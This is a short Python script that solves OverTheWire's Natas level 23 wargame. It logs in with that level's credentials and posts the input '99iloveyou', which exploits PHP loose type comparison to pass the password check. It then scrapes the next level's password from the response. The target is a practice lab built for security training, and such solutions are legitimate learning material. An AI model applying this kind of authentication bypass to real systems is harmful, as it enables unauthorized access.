import requests
import re

URL = 'http://natas23.natas.labs.overthewire.org'
AUTH = ('natas23', 'qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj')

data = {
    'passwd': '99iloveyou'
}

r = requests.post(url=URL, data=data, auth=AUTH)

print('password', re.findall(r'Password: (.*?)</pre>', r.text))
